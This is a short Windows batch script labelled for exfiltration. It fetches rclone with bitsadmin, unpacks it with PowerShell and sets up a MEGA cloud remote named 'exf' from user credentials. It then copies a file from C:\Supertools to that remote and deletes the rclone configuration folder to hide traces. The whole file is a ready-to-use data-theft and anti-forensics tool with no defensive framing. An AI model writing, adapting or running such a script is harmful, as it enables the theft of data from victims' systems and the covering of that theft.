@echo off

rem inset your mega cloud credentials
set mega_user=
set mega_pass=

:exfiltration 
bitsadmin/transfer Procdump /download /priority FOREGROUND  https://downloads.rclone.org/v1.57.0/rclone-v1.57.0-windows-amd64.zip  C:\Supertools\Rclone.zip
powershell.exe -command "Expand-Archive -Force 'C:\Supertools\Rclone.zip' 'C:\Supertools\Rclone'"

cd C:\Supertools\Rclone\rclone-v1.57.0-windows-amd64\

rclone config create exf mega user %mega_user% pass %mega_pass%

rclone.exe copy \Supertools\PS.txt exf:test

rmdir /Q /S "%USERPROFILE%\.conf

exit /b
